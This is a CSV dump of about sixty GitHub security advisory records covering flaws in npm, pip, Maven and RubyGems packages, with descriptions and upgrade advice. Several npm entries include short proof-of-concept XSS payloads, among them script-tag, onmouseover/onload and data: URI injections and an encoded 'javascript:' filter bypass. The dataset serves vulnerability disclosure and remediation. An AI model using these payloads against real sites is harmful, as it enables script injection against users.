1224,18839,rack,GHSA-5r2p-j47h-mhpg,CVE-2018-16471,https://github.com/advisories/GHSA-5r2p-j47h-mhpg,moderate,2018-11-15 15:59:08 UTC,Moderate severity vulnerability that affects rack,"There is a possible XSS vulnerability in Rack before 2.0.6 and 1.6.11. Carefully crafted requests can impact the data returned by the `scheme` method on `Rack::Request`. Applications that expect the scheme to be limited to 'http' or 'https' and do not escape the return value could be vulnerable to an XSS attack. Note that applications using the normal escaping mechanisms provided by Rails may not impacted, but applications that bypass the escaping mechanisms, or do not use them may be vulnerable.",rubygems
1225,16836,i18next,GHSA-f89g-whpf-6q9m,CVE-2017-16008,https://github.com/advisories/GHSA-f89g-whpf-6q9m,moderate,2018-11-09 17:46:56 UTC,Cross-Site Scripting in i18next,"Affected versions of `i18next` allow untrusted user input to be injected into dictionary key names, resulting in a cross-site scripting vulnerability.

## Proof of Concept
```
var init = i18n.init({debug: true}, function(){
  var test = i18n.t('__firstName__ __lastName__', {
        escapeInterpolation: true,
        firstName: '__lastNameHTML__',
        lastName: '<script>',
  });
  console.log(test);
});
// equals ""<script> &lt;script&gt;""
```


## Recommendation

Update to version 1.10.3 or later.",npm
1226,17984,remarkable,GHSA-mrmf-qwxg-7c3h,CVE-2017-16006,https://github.com/advisories/GHSA-mrmf-qwxg-7c3h,high,2018-11-09 17:48:20 UTC,XSS in Data URI in remarkable,"Affected versions of `remarkable` are vulnerable to cross-site scripting. Vulnerable versions of the package allow the use of `data:` URIs in links, and can therefore execute javascript. 


## Proof of Concept

```
[link](data:text/html,<script>alert('0')</script>)
```


## Recommendation

Update to v1.7.0 or later",npm
1227,17508,sanitize-html,GHSA-wg96-3933-j2w5,CVE-2017-16017,https://github.com/advisories/GHSA-wg96-3933-j2w5,moderate,2018-11-09 17:45:55 UTC,Cross-Site Scripting in sanitize-html,"Affected versions of `sanitize-html` are vulnerable to cross-site scripting.

## Proof of Concept:

`<IMG SRC= onmouseover=""alert('XSS');"">`
produces the following:

`<img src=""onmouseover=""alert('XSS');"""" />`
This is definitely invalid HTML, but would suggest that it's being interpreted incorrectly by the parser.


## Recommendation

Update to version 1.2.3 or later.",npm
1228,16430,http-proxy,GHSA-9xw9-pvgv-6p76,CVE-2017-16014,https://github.com/advisories/GHSA-9xw9-pvgv-6p76,moderate,2018-11-09 17:47:52 UTC,Insufficient Error Handling in http-proxy,"Affected versions of `http-proxy` are vulnerable to a denial of service attack, wherein an attacker can force an error which will cause the server to crash.


## Recommendation

Update to version 0.7.0 or later.",npm
1229,17508,sanitize-html,GHSA-xc6g-ggrc-qq4r,CVE-2017-16016,https://github.com/advisories/GHSA-xc6g-ggrc-qq4r,moderate,2018-11-09 17:47:23 UTC,Cross-Site Scripting in sanitize-html,"Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.

## Proof of Concept

```
var sanitizeHtml = require('sanitize-html');

var dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';
var clean = sanitizeHtml(dirty, {
    allowedTags: [ 'textarea' ]
});

console.log(clean);

// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!
```


## Recommendation

Update to version 1.11.4 or later.",npm
1230,16647,restify,GHSA-qw3g-35hc-fcrh,CVE-2017-16018,https://github.com/advisories/GHSA-qw3g-35hc-fcrh,moderate,2018-11-09 17:45:38 UTC,Cross-Site Scripting (XSS) in restify,"Affected versions of `restify` are susceptible to a cross-site scripting vulnerability when using URL encoded script tags in a non-existent URL.

## Proof of Concept:

Request
```
https://localhost:3000/no5_such3_file7.pl?%22%3E%3Cscript%3Ealert(73541);%3C/script%3E
```

Will be included in response:

```<script>alert(73541);</script>```


## Recommendation

Update to version 4.1.0 or later.",npm
1231,15823,request,GHSA-7xfp-9c55-5vqj,CVE-2017-16026,https://github.com/advisories/GHSA-7xfp-9c55-5vqj,moderate,2018-11-09 17:44:01 UTC,Remote Memory Exposure in request,"Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.

## Proof of Concept

```
var request = require('request');
var http = require('http');

var serveFunction = function (req, res){
	req.on('data', function (data) {
            console.log(data)
        });
	res.end();
};
var server = http.createServer(serveFunction);
server.listen(8000);

request({
	method: ""POST"",
	uri: 'http://localhost:8000',
	multipart: [{body:500}]
},function(err,res,body){});
```


## Recommendation

Update to version 2.68.0 or later",npm
1232,35257,io.spray:spray-json_2.12,GHSA-q8xj-8xg3-w432,CVE-2018-18854,https://github.com/advisories/GHSA-q8xj-8xg3-w432,high,2018-11-09 17:41:35 UTC,Uncontrolled Resource Consumption in spray-json,Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of many JSON object fields (with keys that have the same hash code).,maven
1233,35257,io.spray:spray-json_2.12,GHSA-f94m-mqhr-mc29,CVE-2018-18853,https://github.com/advisories/GHSA-f94m-mqhr-mc29,high,2018-11-09 17:42:26 UTC,Uncontrolled Resource Consumption in spray-json when parsing decimal digit fields,Lightbend Spray spray-json through 1.3.4 allows remote attackers to cause a denial of service (resource consumption) because of Algorithmic Complexity during the parsing of a field composed of many decimal digits.,maven
1234,20253,python-gnupg,GHSA-2jc8-4r6g-282j,CVE-2014-1928,https://github.com/advisories/GHSA-2jc8-4r6g-282j,moderate,2018-11-06 23:13:02 UTC,Moderate severity vulnerability that affects python-gnupg,"The shell_quote function in python-gnupg 0.3.5 does not properly escape characters, which allows context-dependent attackers to execute arbitrary code via shell metacharacters in unspecified vectors, as demonstrated using ""\"" (backslash) characters to form multi-command sequences, a different vulnerability than CVE-2014-1927.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",pip
1235,16531,nunjucks,GHSA-f7ph-p5rv-phw2,CVE-2016-10547,https://github.com/advisories/GHSA-f7ph-p5rv-phw2,moderate,2018-11-06 23:13:37 UTC,Cross-Site Scripting in nunjucks,"Affected versions of `nunjucks` do not properly escape specially structured user input in template vars when in auto-escape mode, resulting in a cross-site scripting vulnerability.

## Proof of Concept

By using an array for the keys in a template var, escaping is bypassed.
```javascript
name[]=<script>alert(1)</script>
```

A full PoC is available in the references section.


## Recommendation

Update to version 2.4.3 or later.",npm
1236,17908,jwt-simple,GHSA-vgrx-w6rg-8fqf,CVE-2016-10555,https://github.com/advisories/GHSA-vgrx-w6rg-8fqf,critical,2018-11-06 23:12:07 UTC,Forgeable Public/Private Tokens in jwt-simple,"Affected versions of the `jwt-simple` package allow users to select what algorithm the server will use to verify a provided JWT. A malicious actor can use this behaviour to arbitrarily modify the contents of a JWT while still passing verification. For the common use case of the JWT, the end result is a complete authentication bypass with minimal effort.



## Recommendation

Update to version 0.3.1 or later.

Additionally, be sure to always specify an algorithm in calls to `.decode()`.",npm
1237,16255,validator,GHSA-79mx-88w7-8f7q,CVE-2014-9772,https://github.com/advisories/GHSA-79mx-88w7-8f7q,moderate,2018-11-06 23:12:49 UTC,XSS Filter Bypass via Encoded URL in validator,"Versions of `validator` prior to 2.0.0 contained an xss filter method that is affected by several filter bypasses. This may result in a cross-site scripting vulnerability.


## Proof of Concept
The xss() function removes the word ""javascript"" when contained inside an attribute.

However, it does not properly handle cases where characters have been hex-encoded. 

As a result, it is possible to build an input that bypasses the filter but which the browser will accept as valid JavaScript.

For example:
```<a href=""jav&#x61;script:..."">abc</a>```
will render as:
```<a href=""javascript:..."">abc</a>```


## Recommendation

The package author has decided to remove the xss filter functionality in the latest version of this module. If this feature is not currently being used, you are not affected by the vulnerability. If it is being used, updating to the latest version of the module will break your application.

In order for affected users to mitigate this vulnerability, it is necessary to use an [alternative package](https://www.npmjs.com/search?q=xss%20filter&page=1&ranking=optimal) that provides similar functionality.",npm
1238,19467,loofah,GHSA-g4xq-jx4w-4cjv,CVE-2018-16468,https://github.com/advisories/GHSA-g4xq-jx4w-4cjv,moderate,2018-11-01 14:46:01 UTC,Moderate severity vulnerability that affects loofah,"In the Loofah gem for Ruby, through version 2.2.2, unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished. Users are advised to upgrade to version 2.2.3.

See https://github.com/flavorjones/loofah/issues/154 for more details.",rubygems
1239,16534,merge,GHSA-f9cm-qmx5-m98h,CVE-2018-16469,https://github.com/advisories/GHSA-f9cm-qmx5-m98h,low,2018-11-01 14:45:42 UTC,Prototype Pollution in merge,"Versions of `merge` before 1.2.1 are vulnerable to prototype pollution. The `merge.recursive` function can be tricked into adding or modifying properties of the Object prototype.


## Recommendation

Update to version 1.2.1 or later.",npm
1240,16248,parcel-bundler,GHSA-37q6-576q-vgr7,CVE-2018-14731,https://github.com/advisories/GHSA-37q6-576q-vgr7,high,2018-10-30 20:36:53 UTC,Missing Origin Validation in parcel-bundler,"Versions of `parcel-bundler` before 1.10.0 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.


## Recommendation

Update to version 1.10.0 or later.",npm
1241,19826,requests,GHSA-x84v-xcm2-53pg,CVE-2018-18074,https://github.com/advisories/GHSA-x84v-xcm2-53pg,high,2018-10-29 19:06:46 UTC,Insufficiently Protected Credentials in Requests,"The Requests package through 2.19.1 before 2018-09-14 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.",pip
1242,37757,ro.pippo:pippo-core,GHSA-7fm6-2qw4-g3x3,CVE-2018-18628,https://github.com/advisories/GHSA-7fm6-2qw4-g3x3,critical,2018-10-24 19:46:20 UTC,Deserialization of Untrusted Data in Pippo,"An issue was discovered in Pippo 1.11.0. The function SerializationSessionDataTranscoder.decode() calls ObjectInputStream.readObject() to deserialize a SessionData object without checking the object types. An attacker can create a malicious object, base64 encode it, and place it in the PIPPO_SESSION field of a cookie. Sending this cookie may lead to remote code execution.",maven
1243,34032,com.alibaba:fastjson,GHSA-xjrr-xv9m-4pw5,CVE-2017-18349,https://github.com/advisories/GHSA-xjrr-xv9m-4pw5,critical,2018-10-24 19:42:03 UTC,Improper Input Validation in alilibaba:fastjson,"parseObject in Fastjson before 1.2.25, as used in FastjsonEngine in Pippo 1.11.0 and other products, allows remote attackers to execute arbitrary code via a crafted JSON request, as demonstrated by a crafted rmi:// URI in the dataSourceName field of HTTP POST data to the Pippo /json URI, which is mishandled in AjaxApplication.java.",maven
1244,15818,express,GHSA-gpvr-g6gh-9mc2,CVE-2014-6393,https://github.com/advisories/GHSA-gpvr-g6gh-9mc2,moderate,2018-10-23 17:22:54 UTC,No Charset in Content-Type Header in express,"Vulnerable versions of express do not specify a charset field in the content-type header while displaying 400 level response messages. The lack of enforcing user's browser to set correct charset, could be leveraged by an attacker to perform a cross-site scripting attack, using non-standard encodings, like UTF-7.


## Recommendation

For express 3.x, update express to version 3.11 or later.
For express 4.x, update express to version 4.5 or later. ",npm
1245,20473,markdown2,GHSA-p6h9-gw49-rqm4,CVE-2018-5773,https://github.com/advisories/GHSA-p6h9-gw49-rqm4,moderate,2018-07-12 20:29:21 UTC,markdown2 is vulnerable to cross-site scripting,"An issue was discovered in `markdown2` (aka python-markdown2) through 2.3.5. The `safe_mode` feature, which is supposed to sanitize user input against XSS, is flawed and does not escape the input properly. With a crafted payload, XSS can be triggered, as demonstrated by omitting the final `>` character from an IMG tag.",pip
1246,35923,com.typesafe.akka:akka-http-core_2.12,GHSA-gfx6-ph4q-q54q,CVE-2017-1000118,https://github.com/advisories/GHSA-gfx6-ph4q-q54q,high,2018-10-22 20:53:02 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in akka-http-core,Akka HTTP versions <= 10.0.5 Illegal Media Range in Accept Header Causes StackOverflowError Leading to Denial of Service,maven
1247,35923,com.typesafe.akka:akka-http-core_2.12,GHSA-9qgc-p27w-3hjg,CVE-2018-16131,https://github.com/advisories/GHSA-9qgc-p27w-3hjg,high,2018-10-22 20:37:07 UTC,High severity vulnerability that affects com.typesafe.akka:akka-http-core_2.11 and com.typesafe.akka:akka-http-core_2.12,The decodeRequest and decodeRequestWith directives in Lightbend Akka HTTP 10.1.x through 10.1.4 and 10.0.x through 10.0.13 allow remote attackers to cause a denial of service (memory consumption and daemon crash) via a ZIP bomb.,maven
1248,35118,org.springframework.security.oauth:spring-security-oauth2,GHSA-h8w4-qv99-f7vj,CVE-2018-15758,https://github.com/advisories/GHSA-h8w4-qv99-f7vj,high,2018-10-19 22:00:28 UTC,High severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth2,"Spring Security OAuth, versions 2.3 prior to 2.3.4, and 2.2 prior to 2.2.3, and 2.1 prior to 2.1.3, and 2.0 prior to 2.0.16, and older unsupported versions could be susceptible to a privilege escalation under certain conditions. A malicious user or attacker can craft a request to the approval endpoint that can modify the previously saved authorization request and lead to a privilege escalation on the subsequent approval. This scenario can happen if the application is configured to use a custom approval endpoint that declares AuthorizationRequest as a controller method argument. This vulnerability exposes applications that meet all of the following requirements: Act in the role of an Authorization Server (e.g. @EnableAuthorizationServer) and use a custom Approval Endpoint that declares AuthorizationRequest as a controller method argument. This vulnerability does not expose applications that: Act in the role of an Authorization Server and use the default Approval Endpoint, act in the role of a Resource Server only (e.g. @EnableResourceServer), act in the role of a Client only (e.g. @EnableOAuthClient).",maven
1249,34172,io.vertx:vertx-core,GHSA-6cw8-7j6c-hccp,CVE-2018-12537,https://github.com/advisories/GHSA-6cw8-7j6c-hccp,moderate,2018-10-19 17:43:36 UTC,Moderate severity vulnerability that affects io.vertx:vertx-core,"In Eclipse Vert.x version 3.0 to 3.5.1, the HttpServer response headers and HttpClient request headers do not filter carriage return and line feed characters from the header value. This allow unfiltered values to inject a new header in the client request or server response.",maven
1250,34847,com.sparkjava:spark-core,GHSA-76qr-mmh8-cp8f,CVE-2018-9159,https://github.com/advisories/GHSA-76qr-mmh8-cp8f,moderate,2018-10-19 16:56:00 UTC,Moderate severity vulnerability that affects com.sparkjava:spark-core,"In Spark before 2.7.2, a remote attacker can read unintended static files via various representations of absolute or relative pathnames, as demonstrated by file: URLs and directory traversal sequences. NOTE: this product is unrelated to Ignite Realtime Spark.",maven
1251,34497,io.undertow:undertow-core,GHSA-mcfm-h73v-635m,CVE-2017-2666,https://github.com/advisories/GHSA-mcfm-h73v-635m,moderate,2018-10-19 16:55:14 UTC,Undertow-core vulnerable to HTTP Request Smuggling,"It was discovered in Undertow that the code that parsed the HTTP request line permitted invalid characters. This could be exploited, in conjunction with a proxy that also permitted the invalid characters but with a different interpretation, to inject data into the HTTP response. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own.",maven
1252,34497,io.undertow:undertow-core,GHSA-3x7h-5hfr-hvjm,CVE-2017-2670,https://github.com/advisories/GHSA-3x7h-5hfr-hvjm,moderate,2018-10-19 16:54:56 UTC,Moderate severity vulnerability that affects io.undertow:undertow-core,"It was found in Undertow before 1.3.28 that with non-clean TCP close, the Websocket server gets into infinite loop on every IO thread, effectively causing DoS.",maven
1253,33893,org.scala-lang:scala-compiler,GHSA-qvxv-pmq9-4q7g,CVE-2017-15288,https://github.com/advisories/GHSA-qvxv-pmq9-4q7g,high,2018-10-19 16:51:11 UTC,High severity vulnerability that affects org.scala-lang:scala-compiler,"The compilation daemon in Scala before 2.10.7, 2.11.x before 2.11.12, and 2.12.x before 2.12.4 uses weak permissions for private files in /tmp/scala-devel/${USER:shared}/scalac-compile-server-port, which allows local users to write to arbitrary class files and consequently gain privileges.",maven
1254,34549,org.asynchttpclient:async-http-client,GHSA-93jq-624g-4p9p,CVE-2017-14063,https://github.com/advisories/GHSA-93jq-624g-4p9p,high,2018-10-19 16:50:50 UTC,Improper Input Validation in async-http-client,Async Http Client (aka async-http-client) before 2.0.35 can be tricked into connecting to a host different from the one extracted by java.net.URI if a '?' character occurs in a fragment identifier. Similar bugs were previously identified in cURL (CVE-2016-8624) and Oracle Java 8 java.net.URL.,maven
1255,39194,io.swagger:swagger-codegen,GHSA-q7pf-qr96-2vq5,CVE-2017-1000208,https://github.com/advisories/GHSA-q7pf-qr96-2vq5,high,2018-10-19 16:46:41 UTC,Deserialization of Untrusted Data in swagger-parser,"A vulnerability in Swagger-Parser's (version <= 1.0.30) yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",maven
1256,36654,io.swagger:swagger-parser,GHSA-vgvf-9jh3-fg75,CVE-2017-1000207,https://github.com/advisories/GHSA-vgvf-9jh3-fg75,high,2018-10-19 16:46:30 UTC,Deserialization of Untrusted Data in swagger-codegen,"A vulnerability in Swagger-Parser's version <= 1.0.30 and Swagger codegen version <= 2.2.2 yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",maven
1257,35432,org.grails:grails-core,GHSA-q25j-gcmv-5qpp,CVE-2018-1000529,https://github.com/advisories/GHSA-q25j-gcmv-5qpp,moderate,2018-10-19 16:46:01 UTC,Moderate severity vulnerability that affects org.grails.plugins:fields and org.grails:grails-core,Grails Fields plugin version 2.2.7 contains a Cross Site Scripting (XSS) vulnerability in Using the display tag that can result in XSS . This vulnerability appears to have been fixed in 2.2.8.,maven
1258,38291,org.apache.juddi:juddi-client,GHSA-p99p-726h-c8v5,CVE-2018-1307,https://github.com/advisories/GHSA-p99p-726h-c8v5,high,2018-10-19 16:42:15 UTC,Apache juddi-client vulnerable to XML External Entity (XXE),"In Apache jUDDI 3.2 through 3.3.4, if using the WADL2Java or WSDL2Java classes, which parse a local or remote XML document and then mediates the data structures into UDDI data structures, there are little protections present against entity expansion and DTD type of attacks. Mitigation is to use 3.3.5.",maven
1259,34003,org.apache.commons:commons-compress,GHSA-hrmr-f5m6-m9pq,CVE-2018-11771,https://github.com/advisories/GHSA-hrmr-f5m6-m9pq,moderate,2018-10-19 16:41:27 UTC,Moderate severity vulnerability that affects org.apache.commons:commons-compress,"When reading a specially crafted ZIP archive, the read method of Apache Commons Compress 1.7 to 1.17's ZipArchiveInputStream can fail to return the correct EOF indication after the end of the stream has been reached. When combined with a java.io.InputStreamReader this can lead to an infinite stream, which can be used to mount a denial of service attack against services that use Compress' zip package.",maven
1260,35760,org.apache.qpid:qpid-broker,GHSA-4r7g-7cpj-5jr7,CVE-2017-15701,https://github.com/advisories/GHSA-4r7g-7cpj-5jr7,high,2018-10-19 16:41:15 UTC,Apache Qpid Broker-J vulnerable to Denial of Service (DoS) via uncontrolled resource consumption,In Apache Qpid Broker-J versions 6.1.0 through 6.1.4 (inclusive) the broker does not properly enforce a maximum frame size in AMQP 1.0 frames. A remote unauthenticated attacker could exploit this to cause the broker to exhaust all available memory and eventually terminate.  Older AMQP protocols are not affected.,maven
1261,35760,org.apache.qpid:qpid-broker,GHSA-269m-695x-j34p,CVE-2017-15702,https://github.com/advisories/GHSA-269m-695x-j34p,critical,2018-10-19 16:41:04 UTC,Apache Qpid Broker vulnerable to authentication port spoofing,"Apache Qpid Broker-J versions 0.18 through 0.32 are vulnerable to authentication port spoofing. When the broker is configured with different authentication providers on different ports, one of which is an HTTP port, then the broker can be tricked by a remote unauthenticated attacker connecting to the HTTP port into using an authentication provider that was configured on a different port. The attacker still needs valid credentials with the authentication provider on the spoofed port. This becomes an issue when the spoofed port has weaker authentication protection (e.g., anonymous access, default accounts) and is normally protected by firewall rules or similar which can be circumvented by this vulnerability. AMQP ports are not affected.",maven
1262,33935,org.eclipse.jetty:jetty-server,GHSA-872g-2h8h-362q,CVE-2016-4800,https://github.com/advisories/GHSA-872g-2h8h-362q,critical,2018-10-19 16:16:16 UTC,Jetty contains an alias issue that could allow unauthenticated remote code execution due to specially crafted request,"The path normalization mechanism in PathResource class in Eclipse Jetty 9.3.x before 9.3.9 on Windows allows remote attackers to bypass protected resource restrictions and other security constraints via a URL with certain escaped characters, related to backslashes.",maven
1263,34974,org.apache.struts:struts2-core,GHSA-cr6j-3jp9-rw65,CVE-2018-11776,https://github.com/advisories/GHSA-cr6j-3jp9-rw65,high,2018-10-18 19:24:38 UTC,Apache Struts vulnerable to remote command execution (RCE) due to improper input validation,"Apache Struts contains a Remote Code Execution when using results with no namespace and it's upper actions have no or wildcard namespace. The same flaw exists when using a url tag with no value, action set,  and it's upper actions have no or wildcard namespace.",maven
1264,35118,org.springframework.security.oauth:spring-security-oauth2,GHSA-7q9c-h23x-65fq,CVE-2016-4977,https://github.com/advisories/GHSA-7q9c-h23x-65fq,high,2018-10-18 18:06:22 UTC,Spring Security OAuth vulnerable to remote code execution (RCE) via specially crafted request using whitelabel views,"When processing authorization requests using the whitelabel views in Spring Security OAuth 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5, the response_type parameter value was executed as Spring SpEL which enabled a malicious user to trigger remote code execution via the crafting of the value for response_type.",maven
1265,34743,org.springframework.amqp:spring-amqp,GHSA-w4g2-9hj6-5472,CVE-2018-11087,https://github.com/advisories/GHSA-w4g2-9hj6-5472,moderate,2018-10-18 18:06:08 UTC,Moderate severity vulnerability that affects com.rabbitmq:amqp-client and org.springframework.amqp:spring-amqp,"Pivotal Spring AMQP, 1.x versions prior to 1.7.10 and 2.x versions prior to 2.0.6, expose a man-in-the-middle vulnerability due to lack of hostname validation. A malicious user that has the ability to intercept traffic would be able to view data in transit.",maven
1266,34029,org.springframework.boot:spring-boot,GHSA-xx65-cc7g-9pfp,CVE-2018-1196,https://github.com/advisories/GHSA-xx65-cc7g-9pfp,moderate,2018-10-18 18:05:57 UTC,Moderate severity vulnerability that affects org.springframework.boot:spring-boot,"Spring Boot supports an embedded launch script that can be used to easily run the application as a systemd or init.d linux service. The script included with Spring Boot 1.5.9 and earlier and 2.0.0.M1 through 2.0.0.M7 is susceptible to a symlink attack which allows the ""run_user"" to overwrite and take ownership of any file on the same system. In order to instigate the attack, the application must be installed as a service and the ""run_user"" requires shell access to the server. Spring Boot application that are not installed as a service, or are not using the embedded launch script are not susceptible.",maven
1267,37675,org.bouncycastle:bcprov-jdk14,GHSA-9gp4-qrff-c648,CVE-2016-1000345,https://github.com/advisories/GHSA-9gp4-qrff-c648,moderate,2018-10-18 18:04:13 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES/ECIES CBC mode vulnerable to padding oracle attack. For BC 1.55 and older, in an environment where timings can be easily observed, it is possible with enough observations to identify when the decryption is failing due to padding.",maven
1268,34113,com.fasterxml.jackson.dataformat:jackson-dataformat-xml,GHSA-7c2r-3jqf-c9rw,CVE-2016-7051,https://github.com/advisories/GHSA-7c2r-3jqf-c9rw,high,2018-10-18 17:43:28 UTC,jackson-dataformat-xml vulnerable to server side request forgery (SSRF),Versions of jackson-dataformat-xml) prior to 2.7.8 and prior to  2.8.4 allow remote attackers to conduct server-side request forgery (SSRF) attacks via vectors related to a DTD.,maven
1269,34113,com.fasterxml.jackson.dataformat:jackson-dataformat-xml,GHSA-hmq6-frv3-4727,CVE-2016-3720,https://github.com/advisories/GHSA-hmq6-frv3-4727,critical,2018-10-18 17:43:16 UTC,jackson-dataformat-xml vulnerable to XML external entity (XXE),XML external entity (XXE) vulnerability in XmlMapper in the Data format extension for Jackson (aka jackson-dataformat-xml) allows attackers to have unspecified impact via unknown vectors.,maven
1270,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-rfx6-vp9g-rh7v,CVE-2017-17485,https://github.com/advisories/GHSA-rfx6-vp9g-rh7v,critical,2018-10-18 17:42:48 UTC,jackson-databind vulnerable to remote code execution due to incorrect deserialization and blocklist bypass,"FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.",maven
1271,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-h592-38cm-4ggp,CVE-2017-15095,https://github.com/advisories/GHSA-h592-38cm-4ggp,critical,2018-10-18 17:42:34 UTC,jackson-databind vulnerable to deserialization flaw leading to unauthenticated remote code execution,"jackson-databind in versions prior to 2.8.10 and 2.9.1, contain a deserialization flaw which allows an unauthenticated user to perform code execution by sending maliciously crafted input to the readValue method of the ObjectMapper. This issue extends the previous flaw CVE-2017-7525, blacklisting additonal vulnerable classes.",maven
1272,35611,com.orientechnologies:orientdb-core,GHSA-xm6r-4466-mr74,CVE-2017-11467,https://github.com/advisories/GHSA-xm6r-4466-mr74,critical,2018-10-18 17:40:56 UTC,OrientDB vulnerable to Improper Privilage Management leading to arbitrary command injection,"OrientDB through 2.2.22 does not enforce privilege requirements during ""where"" or ""fetchplan"" or ""order by"" use, which allows remote attackers to execute arbitrary OS commands via a crafted request.",maven
1273,38629,org.owasp.antisamy:antisamy,GHSA-xv6v-72hh-g6g2,CVE-2018-1000643,https://github.com/advisories/GHSA-xv6v-72hh-g6g2,moderate,2018-10-18 17:22:26 UTC,Moderate severity vulnerability that affects org.owasp.antisamy:antisamy,OWASP OWASP ANTISAMY version 1.5.7 and earlier contains a Cross Site Scripting (XSS) vulnerability in AntiSamy.scan() - for both SAX & DOM that can result in Cross Site Scripting.,maven
1274,38629,org.owasp.antisamy:antisamy,GHSA-q44v-xc3g-v7jq,CVE-2017-14735,https://github.com/advisories/GHSA-q44v-xc3g-v7jq,moderate,2018-10-18 17:22:11 UTC,Moderate severity vulnerability that affects org.owasp.antisamy:antisamy,"OWASP AntiSamy before 1.5.7 allows XSS via HTML5 entities, as demonstrated by use of &colon; to construct a javascript: URL.",maven
1275,38629,org.owasp.antisamy:antisamy,GHSA-683w-6h9j-57wq,CVE-2016-10006,https://github.com/advisories/GHSA-683w-6h9j-57wq,moderate,2018-10-18 17:21:47 UTC,Moderate severity vulnerability that affects org.owasp.antisamy:antisamy,"In OWASP AntiSamy before 1.5.5, by submitting a specially crafted input (a tag that supports style with active content), you could bypass the library protections and supply executable code. The impact is XSS.",maven
1276,35825,org.keycloak:keycloak-core,GHSA-r32r-3977-cgc3,CVE-2014-3651,https://github.com/advisories/GHSA-r32r-3977-cgc3,high,2018-10-18 16:50:20 UTC,Keycloak vulnerable to uncontrolled resource consumption,"JBoss KeyCloak versions prior to 1.0.3.Final allow remote attackers to create a denial of service (resource consumption) by supplying a large value in the size parameter to auth/qrcode, related to QR code generation.",maven
1277,35825,org.keycloak:keycloak-core,GHSA-959q-32g8-vvp7,CVE-2017-12161,https://github.com/advisories/GHSA-959q-32g8-vvp7,moderate,2018-10-18 16:50:05 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,"It was found that keycloak before 3.4.2 final would permit misuse of a client-side /etc/hosts entry to spoof a URL in a password reset request. An attacker could use this flaw to craft a malicious password reset request and gain a valid reset token, leading to information disclosure or further attacks.",maven
1278,35825,org.keycloak:keycloak-core,GHSA-h7j7-pw3v-3v3x,CVE-2018-10912,https://github.com/advisories/GHSA-h7j7-pw3v-3v3x,moderate,2018-10-18 16:49:54 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,keycloak before version 4.0.0.final is vulnerable to a infinite loop in session replacement. A Keycloak cluster with multiple nodes could mishandle an expired session replacement and lead to an infinite loop. A malicious authenticated user could use this flaw to achieve Denial of Service on the server.,maven
1279,35825,org.keycloak:keycloak-core,GHSA-c77r-6f64-478q,CVE-2017-2582,https://github.com/advisories/GHSA-c77r-6f64-478q,moderate,2018-10-18 16:49:40 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,"It was found that while parsing the SAML messages the StaxParserUtil class of keycloak before 2.5.1 replaces special strings for obtaining attribute values with system property. This could allow an attacker to determine values of system properties at the attacked system by formatting the SAML request ID field to be the chosen system property which could be obtained in the ""InResponseTo"" field in the response.",maven
1280,35825,org.keycloak:keycloak-core,GHSA-jc6q-27mw-p55w,CVE-2017-2646,https://github.com/advisories/GHSA-jc6q-27mw-p55w,high,2018-10-18 16:49:29 UTC,Keycloak vulnerable to infinite loop based Denial of Service,"When Keycloak versions prior to 2.5.5 receive a Logout request with an Extensions in the middle of the request, the SAMLSloRequestParser.parse() method ends in an infinite loop. An attacker could use this flaw to conduct denial of service attacks.",maven
1281,35825,org.keycloak:keycloak-core,GHSA-95m6-mjh3-58gm,CVE-2016-8609,https://github.com/advisories/GHSA-95m6-mjh3-58gm,high,2018-10-18 16:48:41 UTC,Improper Authentication in org.keycloak:keycloak-core,"It was found that the keycloak before 2.3.0 did not implement authentication flow correctly. An attacker could use this flaw to construct a phishing URL, from which he could hijack the user's session. This could lead to information disclosure, or permit further possible attacks.",maven
1282,35825,org.keycloak:keycloak-core,GHSA-qgm9-232x-hwpx,CVE-2017-1000500,https://github.com/advisories/GHSA-qgm9-232x-hwpx,moderate,2018-10-18 16:48:15 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,Withdrawn: Duplicate of CVE-2017-12161 / GHSA-959q-32g8-vvp7,maven
1283,35825,org.keycloak:keycloak-core,GHSA-778x-2mqv-w6xw,CVE-2016-8629,https://github.com/advisories/GHSA-778x-2mqv-w6xw,moderate,2018-10-18 16:48:01 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,Red Hat Keycloak before version 2.4.0 did not correctly check permissions when handling service account user deletion requests sent to the rest server. An attacker with service account authentication could use this flaw to bypass normal permissions and delete users in a separate realm.,maven
